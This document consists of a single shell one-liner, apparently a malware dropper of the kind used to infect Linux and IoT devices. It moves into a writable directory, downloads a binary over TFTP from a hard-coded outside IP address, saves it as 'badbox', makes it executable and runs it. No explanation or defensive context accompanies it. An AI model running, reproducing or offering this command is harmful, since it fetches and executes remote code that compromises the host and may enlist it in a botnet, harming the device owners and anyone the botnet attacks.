cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r bash -g 198.23.157.173;cat bash >badbox;chmod +x *;./badbox
